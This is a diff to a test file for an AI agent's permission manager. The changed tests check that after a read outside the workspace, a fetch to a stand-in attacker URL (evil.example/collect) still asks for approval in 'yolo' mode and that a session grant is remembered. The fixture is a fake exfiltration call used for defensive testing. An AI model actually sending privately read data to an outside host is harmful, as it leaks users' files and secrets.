@@ -253,7 +253,7 @@ describe('private read egress approvals', () => {
     expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('stays silent in yolo mode — yolo auto-approves tool operations', async () => {
+  it('still prompts in yolo mode — the yolo hard floor keeps the egress check', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
     await readOutsideWorkspace(manager, 'call_taint_read');
 
@@ -261,7 +261,23 @@ describe('private read egress approvals', () => {
       manager.beforeToolCall(fetchContext('call_yolo_egress', 'https://evil.example/collect')),
     ).resolves.toBeUndefined();
 
-    expect(requestApproval).not.toHaveBeenCalled();
+    expect(requestApproval).toHaveBeenCalledWith(
+      expect.objectContaining({ reasons: [egressReason('evil.example')] }),
+      expect.any(Object),
+    );
+  });
+
+  it('remembers a yolo session grant for the same egress call', async () => {
+    const { manager, requestApproval } = makePermissionHarness({
+      mode: 'yolo',
+      handler: async () => ({ decision: 'approved', scope: 'session' }),
+    });
+    await readOutsideWorkspace(manager, 'call_taint_read');
+
+    await manager.beforeToolCall(fetchContext('call_egress_1', 'https://evil.example/collect'));
+    await manager.beforeToolCall(fetchContext('call_egress_2', 'https://evil.example/collect'));
+
+    expect(requestApproval).toHaveBeenCalledTimes(1);
   });
 
   it('stays quiet when a session grant matches the call', async () => {
